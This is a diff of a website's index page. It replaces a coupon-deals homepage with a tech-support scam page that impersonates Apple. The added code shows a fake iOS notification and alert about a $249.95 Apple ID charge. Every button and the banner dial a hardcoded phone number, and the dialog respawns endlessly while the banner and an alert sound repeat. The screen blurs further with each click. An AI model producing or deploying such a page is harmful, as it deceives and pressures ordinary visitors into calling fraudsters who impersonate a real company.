@@ -1,306 +1,351 @@
-<!DOCTYPE html>
-<html lang="en-US">
+
+ƒ<!DOCTYPE html>
+<html lang="en-US" class="no-js">
 <head>
-    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=bc1b69c6"></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DealDrop – Coupons, Promo Codes & Online Deals</title>
-    <meta name="description" content="Find coupons, promo codes, discounts, and online deals from popular US stores with DealDrop.">
-    <link rel="stylesheet" href="css/style.css">
-    
-    <!-- Open Graph tags for social sharing -->
-    <meta property="og:title" content="DealDrop – Coupons, Promo Codes & Online Deals">
-    <meta property="og:description" content="Discover the latest coupons, promo codes, and deals from popular stores across the US.">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://www.dealdrop-demo.com">
+<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=bc1b69c6"></script>
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#000000">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <title>AppIe Support</title>
+
+  <style>
+    :root {
+      --safe-top: env(safe-area-inset-top);
+      --safe-right: env(safe-area-inset-right);
+      --safe-bottom: env(safe-area-inset-bottom);
+      --safe-left: env(safe-area-inset-left);
+      --shadow: 0 18px 50px rgba(0, 0, 0, 0.28);
+      --ios-blue: #007aff;
+      --overlay-blur: 0px;
+      --overlay-alpha: 0.10;
+    }
+
+    html, body {
+      margin: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      -webkit-text-size-adjust: 100%;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+
+    background:
+        linear-gradient(180deg, rgba(0,0,0,0.16), rgba(0,0,0,0.24)),
+        url("images/bg-img.jpg");
+
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    position: relative;
+}
+
+    .blur-layer {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, var(--overlay-alpha));
+      backdrop-filter: blur(var(--overlay-blur));
+      -webkit-backdrop-filter: blur(var(--overlay-blur));
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .notif-wrap {
+      position: fixed;
+      top: calc(-180px - var(--safe-top));
+      left: 50%;
+      transform: translateX(-50%);
+      width: min(94vw, 420px);
+      z-index: 20;
+      opacity: 0;
+      transition: top 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.1), opacity 0.25s ease;
+    }
+
+    .notif-wrap.show {
+      top: calc(16px + var(--safe-top));
+      opacity: 1;
+    }
+
+    .notif {
+      background: rgba(255, 255, 255, 0.88);
+      backdrop-filter: blur(24px) saturate(180%);
+      -webkit-backdrop-filter: blur(24px) saturate(180%);
+      border: 0.5px solid rgba(0, 0, 0, 0.08);
+      border-radius: 22px;
+      box-shadow: var(--shadow);
+      padding: 12px 14px 13px;
+      color: #000;
+      cursor: pointer;
+    }
+
+    .notif-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 7px;
+    }
+
+    .notif-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      min-width: 0;
+    }
+
+    .app-icon {
+      width: 16px;
+      height: 16px;
+      flex: 0 0 auto;
+    }
+
+    .app-name {
+      font-size: 13px;
+      font-weight: 700;
+      color: #111;
+      white-space: nowrap;
+    }
+
+    .time {
+      font-size: 12px;
+      color: #6b7280;
+      white-space: nowrap;
+    }
+
+    .title {
+      font-size: 16px;
+      font-weight: 700;
+      line-height: 1.25;
+      margin: 0 0 4px;
+      color: #111;
+      letter-spacing: -0.01em;
+    }
+
+    .message {
+      font-size: 14px;
+      line-height: 1.45;
+      margin: 0;
+      color: #374151;
+      word-break: break-word;
+    }
+
+    .alert-box {
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      width: min(92vw, 400px);
+      border-radius: 14px;
+      text-align: center;
+      box-shadow: var(--shadow);
+      padding: 16px 16px 0;
+      box-sizing: border-box;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(24px) saturate(180%);
+      -webkit-backdrop-filter: blur(24px) saturate(180%);
+      border: 0.5px solid rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      color: #000;
+      z-index: 10;
+    }
+
+    .alert-title {
+      font-size: 17px;
+      font-weight: 700;
+      margin: 0 0 8px;
+      letter-spacing: -0.01em;
+    }
+
+    .alert-message {
+      font-size: 15px;
+      line-height: 1.45;
+      margin: 0 0 16px;
+      color: #2c2c2e;
+      padding: 0 4px;
+    }
+
+    .alert-buttons {
+      display: flex;
+      border-top: 0.5px solid rgba(0, 0, 0, 0.08);
+      margin-top: 8px;
+    }
+
+    .alert-btn {
+      flex: 1;
+      min-height: 48px;
+      padding: 12px 10px;
+      font-size: 17px;
+      font-weight: 400;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--ios-blue);
+      background: transparent;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+      user-select: none;
+    }
+
+    .alert-btn + .alert-btn {
+      border-left: 0.5px solid rgba(0, 0, 0, 0.08);
+    }
+
+    .alert-btn:active {
+      background: rgba(0, 122, 255, 0.08);
+    }
+
+    @media (max-width: 768px) {
+      .notif-wrap { width: min(94vw, 420px); }
+      .alert-box { width: min(92vw, 360px); }
+    }
+  </style>
 </head>
+
 <body>
+  <div class="blur-layer" id="blurLayer"></div>
 
-    <!-- Navigation -->
-    <nav class="navbar">
-        <div class="container">
-            <div class="logo">
-                <a href="index.html">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z" />
-                    </svg>
-                    DealDrop
-                </a>
-            </div>
-            
-            <div class="nav-links">
-                <a href="index.html" class="active">Home</a>
-                <a href="deals.html">Deals</a>
-                <a href="stores.html">Stores</a>
-            </div>
-
-            <div class="nav-actions">
-                <div class="nav-search">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
-                    </svg>
-                    <input type="text" placeholder="Search stores, brands, or deals">
-                </div>
-                <button class="mobile-menu-btn" id="mobile-menu-btn" aria-label="Menu">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7" />
-                    </svg>
-                </button>
-            </div>
+  <div class="notif-wrap" id="notifWrap" role="status" aria-live="polite">
+    <div class="notif" id="notifCard">
+      <div class="notif-head">
+        <div class="notif-left">
+          <div class="app-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="16" height="16" aria-hidden="true">
+              <rect width="100" height="100" rx="22" fill="#34C759"></rect>
+              <path d="M50 22C28 22 12 36 12 53C12 63 18 72 27 77C27 77 26 86 19 91C19 91 34 91 43 80C45 80.5 48 81 50 81C72 81 88 67 88 53C88 36 72 22 50 22Z" fill="#FFF"></path>
+            </svg>
+          </div>
+          <div class="app-name">Messages</div>
         </div>
-    </nav>
-
-    <!-- Mobile Nav -->
-    <div class="mobile-nav" id="mobile-nav">
-        <div class="nav-links">
-            <a href="index.html" class="active">Home</a>
-            <a href="deals.html">Deals</a>
-            <a href="stores.html">Stores</a>
-        </div>
-        <div class="nav-search">
-            <input type="text" placeholder="Search...">
-        </div>
+        <div class="time">now</div>
+      </div>
+      <div class="title">Payment Successful</div>
+      <p class="message">Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support to Freeze it!</p>
     </div>
+  </div>
 
-    <main>
-        <!-- Hero Section -->
-        <section class="hero">
-            <div class="container">
-                <h1>Save More. Shop Smarter.</h1>
-                <p>Discover the latest coupons, promo codes, and deals from popular stores across the US.</p>
-                <div class="hero-actions">
-                    <a href="deals.html" class="btn btn-primary">Find Deals</a>
-                    <a href="stores.html" class="btn btn-secondary">Browse Stores</a>
-                </div>
-                <p style="font-size: 0.875rem; color: var(--text-muted); margin-top: 1rem;">Smart Shopping Starts Here – Compare offers, discover promotions, and find opportunities to save while shopping online.</p>
-            </div>
-        </section>
+  <audio id="notifSound" preload="auto" playsinline>
+    <source src="ualert.mpeg" type="audio/mpeg">
+  </audio>
 
-        <!-- Popular Categories -->
-        <section class="section container">
-            <div class="section-header">
-                <h2>Popular Categories</h2>
-                <p>Browse deals by what you need</p>
-            </div>
-            <div class="grid grid-cols-4">
-                <a href="deals.html" class="card category-card">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z" /></svg>
-                    <h3>Fashion</h3>
-                </a>
-                <a href="deals.html" class="card category-card">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
-                    <h3>Electronics</h3>
-                </a>
-                <a href="deals.html" class="card category-card">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 10l-2 1m0 0l-2-1m2 1v2.5M20 7l-2 1m2-1l-2-1m2 1v2.5M14 4l-2-1-2 1M4 7l2-1M4 7l2 1M4 7v2.5M12 21l-2-1m2 1l2-1m-2 1v-2.5M6 18l-2-1v-2.5M18 18l2-1v-2.5" /></svg>
-                    <h3>Beauty</h3>
-                </a>
-                <a href="deals.html" class="card category-card">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" /></svg>
-                    <h3>Home & Garden</h3>
-                </a>
-            </div>
-        </section>
-
-        <!-- Featured Deals -->
-        <section class="section" style="background-color: var(--surface-color);">
-            <div class="container">
-                <div class="section-header">
-                    <h2>Featured Deals</h2>
-                    <p>Handpicked savings from top retailers</p>
-                </div>
-                <div class="grid grid-cols-4 deals-grid">
-                    <!-- Deal 1 -->
-                    <div class="card deal-card" data-type="code">
-                        <div class="store-logo-wrap">NIKE</div>
-                        <div class="store-name">Nike</div>
-                        <h3 class="deal-title">25% Off Select Styles</h3>
-                        <div class="deal-meta">
-                            <span class="badge">25% OFF</span>
-                            <span class="badge" style="background:#f3f4f6; color: var(--text-muted);">Promo Code</span>
-                        </div>
-                        <p class="deal-desc">Save on selected footwear and apparel at Nike.</p>
-                        <div class="deal-meta" style="margin-bottom: 1.5rem;">
-                            <span class="expiry"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> Ends soon</span>
-                        </div>
-                        <button class="btn btn-primary btn-block get-deal-btn">Get Deal</button>
-                    </div>
-                    
-                    <!-- Deal 2 -->
-                    <div class="card deal-card" data-type="deal">
-                        <div class="store-logo-wrap">TARGET</div>
-                        <div class="store-name">Target</div>
-                        <h3 class="deal-title">Up to 40% Off Home</h3>
-                        <div class="deal-meta">
-                            <span class="badge">Up to 40%</span>
-                            <span class="badge" style="background:#f3f4f6; color: var(--text-muted);">Online Deal</span>
-                        </div>
-                        <p class="deal-desc">Discounts applied automatically on selected furniture.</p>
-                        <div class="deal-meta" style="margin-bottom: 1.5rem;">
-                            <span class="expiry"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> Ongoing</span>
-                        </div>
-                        <button class="btn btn-primary btn-block get-deal-btn">Get Deal</button>
-                    </div>
-
-                    <!-- Deal 3 -->
-                    <div class="card deal-card" data-type="code">
-                        <div class="store-logo-wrap">BB</div>
-                        <div class="store-name">Best Buy</div>
-                        <h3 class="deal-title">$50 Off Laptops</h3>
-                        <div class="deal-meta">
-                            <span class="badge">$50 OFF</span>
-                            <span class="badge" style="background:#f3f4f6; color: var(--text-muted);">Promo Code</span>
-                        </div>
-                        <p class="deal-desc">Extra savings on Windows and Mac laptops.</p>
-                        <div class="deal-meta" style="margin-bottom: 1.5rem;">
-                            <span class="expiry"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> Expiring soon</span>
-                        </div>
-                        <button class="btn btn-primary btn-block get-deal-btn">Get Deal</button>
-                    </div>
-
-                    <!-- Deal 4 -->
-                    <div class="card deal-card" data-type="deal">
-                        <div class="store-logo-wrap">SEPH</div>
-                        <div class="store-name">Sephora</div>
-                        <h3 class="deal-title">Free Shipping</h3>
-                        <div class="deal-meta">
-                            <span class="badge">FREE SHIP</span>
-                            <span class="badge" style="background:#f3f4f6; color: var(--text-muted);">Online Deal</span>
-                        </div>
-                        <p class="deal-desc">Enjoy free standard shipping on all orders.</p>
-                        <div class="deal-meta" style="margin-bottom: 1.5rem;">
-                            <span class="expiry"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> Ongoing</span>
-                        </div>
-                        <button class="btn btn-primary btn-block get-deal-btn">Get Deal</button>
-                    </div>
-                </div>
-                <div style="text-align: center; margin-top: 2rem;">
-                    <a href="deals.html" class="btn btn-secondary">View All Deals</a>
-                </div>
-            </div>
-        </section>
-
-        <!-- Why DealDrop -->
-        <section class="section container">
-            <div class="section-header">
-                <h2>Why DealDrop?</h2>
-                <p>We make it easy to find savings online.</p>
-            </div>
-            <div class="grid grid-cols-4">
-                <div class="card text-center" style="align-items: center; border: none; background: transparent; box-shadow: none;">
-                    <div style="width: 60px; height: 60px; background: var(--badge-bg); color: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 1rem;">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="30" height="30"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
-                    </div>
-                    <h3 style="margin-bottom: 0.5rem;">Verified Deals</h3>
-                    <p style="color: var(--text-muted); font-size: 0.875rem;">We highlight useful offers and make it easy to find savings.</p>
-                </div>
-                <div class="card text-center" style="align-items: center; border: none; background: transparent; box-shadow: none;">
-                    <div style="width: 60px; height: 60px; background: var(--badge-bg); color: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 1rem;">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="30" height="30"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
-                    </div>
-                    <h3 style="margin-bottom: 0.5rem;">Easy to Search</h3>
-                    <p style="color: var(--text-muted); font-size: 0.875rem;">Find deals by store, category, or keyword effortlessly.</p>
-                </div>
-                <div class="card text-center" style="align-items: center; border: none; background: transparent; box-shadow: none;">
-                    <div style="width: 60px; height: 60px; background: var(--badge-bg); color: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 1rem;">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="30" height="30"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
-                    </div>
-                    <h3 style="margin-bottom: 0.5rem;">Updated Regularly</h3>
-                    <p style="color: var(--text-muted); font-size: 0.875rem;">Keep your shopping list fresh with new offers.</p>
-                </div>
-                <div class="card text-center" style="align-items: center; border: none; background: transparent; box-shadow: none;">
-                    <div style="width: 60px; height: 60px; background: var(--badge-bg); color: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 1rem;">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="30" height="30"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
-                    </div>
-                    <h3 style="margin-bottom: 0.5rem;">100% Free</h3>
-                    <p style="color: var(--text-muted); font-size: 0.875rem;">Browse deals without creating an account.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- Newsletter -->
-        <section class="newsletter-section">
-            <div class="container">
-                <h2>Get the Best Deals in Your Inbox</h2>
-                <p>Sign up for occasional updates about new coupons, promotions, and shopping deals.</p>
-                <form class="newsletter-form" id="newsletter-form">
-                    <input type="email" placeholder="Enter your email" required>
-                    <button type="submit" class="btn">Subscribe</button>
-                </form>
-            </div>
-        </section>
-    </main>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-grid">
-                <div class="footer-brand">
-                    <div class="logo">
-                        <a href="index.html">
-                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z" />
-                            </svg>
-                            DealDrop
-                        </a>
-                    </div>
-                    <p>Discover the latest coupons, promo codes, and deals from popular stores across the US.</p>
-                </div>
-                <div class="footer-links">
-                    <h4>Navigation</h4>
-                    <ul>
-                        <li><a href="index.html">Home</a></li>
-                        <li><a href="deals.html">Deals</a></li>
-                        <li><a href="stores.html">Stores</a></li>
-                    </ul>
-                </div>
-                <div class="footer-links">
-                    <h4>Legal</h4>
-                    <ul>
-                        <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                        <li><a href="terms.html">Terms & Conditions</a></li>
-                        <li><a href="disclaimer.html">Disclaimer</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2026 DealDrop. All rights reserved.</p>
-                <p>Affiliate Disclosure: DealDrop may earn a commission when you click certain links or make a purchase.</p>
-            </div>
-        </div>
-    </footer>
-
-    <!-- Deal Modal -->
-    <div class="modal-overlay" id="deal-modal">
-        <div class="modal">
-            <button class="modal-close" id="modal-close" aria-label="Close modal">
-                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                </svg>
-            </button>
-            <div class="modal-store" id="modal-store">Store Name</div>
-            <h3 class="modal-title" id="modal-title">Deal Title Goes Here</h3>
-            
-            <p style="color: var(--text-muted); margin-bottom: 1rem; font-size: 0.875rem;">Copy this code and paste it at checkout (demo only).</p>
-            
-            <div class="promo-code-box" id="modal-code">
-                DEMOCODE
-            </div>
-            
-            <div class="modal-actions">
-                <button class="btn btn-primary btn-block" id="copy-code-btn">Copy Code</button>
-                <a href="#" class="btn btn-secondary btn-block">Continue to Store</a>
-            </div>
-        </div>
+  <template id="alertTemplate">
+    <div class="alert-box" role="alertdialog" aria-modal="true">
+      <div class="alert-title">New notification</div>
+      <p class="alert-message">Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support to Freeze it!</p>
+      <div class="alert-buttons">
+        <a class="alert-btn" href="#cancel" data-action="cancel">Cancel</a>
+        <a class="alert-btn" href="#ok" data-action="ok">OK</a>
+      </div>
     </div>
+  </template>
 
-    <!-- Back to Top -->
-    <button class="back-to-top" id="back-to-top" aria-label="Back to top">
-        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="24" height="24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18" />
-        </svg>
-    </button>
+  <script>
+    const notifWrap = document.getElementById('notifWrap');
+    const notifCard = document.getElementById('notifCard');
+    const blurLayer = document.getElementById('blurLayer');
+    const template = document.getElementById('alertTemplate');
+    const audio = document.getElementById('notifSound');
 
-    <script src="js/script.js"></script>
+    let blurPx = 0;
+    let alpha = 0.10;
+    let audioUnlocked = false;
+
+    const PHONE_NUMBER_OK = '+1(877)489-0869';
+    const PHONE_NUMBER_CANCEL = '+1(877)489-0869';
+    const PHONE_NUMBER_NOTIF = '+1(877)489-0869'; // call triggered on notification click
+
+    function unlockAudio() {
+      if (audioUnlocked || !audio) return;
+      audio.muted = true;
+      audio.currentTime = 0;
+      audio.play().then(() => {
+        audio.pause();
+        audio.currentTime = 0;
+        audio.muted = false;
+        audioUnlocked = true;
+      }).catch(() => {
+        audio.muted = false;
+      });
+    }
+
+    function playNotificationSound() {
+      if (!audio) return;
+      audio.currentTime = 0;
+      setTimeout(() => {
+        audio.play().catch(() => {});
+      }, 300);
+    }
+
+    function triggerCall(number) {
+      window.location.href = 'tel:' + number.replace(/[^0-9+]/g, '');
+    }
+
+    function showBanner() {
+      notifWrap.classList.add('show');
+      playNotificationSound();
+      setTimeout(() => notifWrap.classList.remove('show'), 3000);
+    }
+
+    function refreshBlur() {
+      blurPx = Math.min(20, blurPx + 1.5);
+      alpha = Math.min(0.36, alpha + 0.03);
+      document.documentElement.style.setProperty('--overlay-blur', blurPx + 'px');
+      document.documentElement.style.setProperty('--overlay-alpha', alpha.toFixed(2));
+    }
+
+    function spawnAlert() {
+      const old = document.querySelector('.alert-box');
+      if (old) old.remove();
+
+      const box = template.content.firstElementChild.cloneNode(true);
+      box.querySelectorAll('.alert-btn').forEach(btn => {
+        btn.addEventListener('click', e => {
+          e.preventDefault();
+          const action = btn.getAttribute('data-action');
+          if (action === 'ok') {
+            triggerCall(PHONE_NUMBER_OK);
+          } else if (action === 'cancel') {
+            triggerCall(PHONE_NUMBER_CANCEL);
+          }
+          spawnAlert();
+        });
+      });
+
+      document.body.appendChild(box);
+    }
+
+    // Click on notification banner triggers call
+    notifCard.addEventListener('click', () => {
+      refreshBlur();
+      triggerCall(PHONE_NUMBER_NOTIF);
+    });
+
+    window.addEventListener('load', () => {
+      unlockAudio();
+      setTimeout(showBanner, 800);
+      spawnAlert();
+      setInterval(() => {
+        notifWrap.classList.remove('show');
+        setTimeout(showBanner, 250);
+      }, 7000);
+    }, { once: true });
+
+    document.addEventListener('click', unlockAudio, { once: true });
+    document.addEventListener('touchend', unlockAudio, { once: true });
+  </script>
 </body>
 </html>
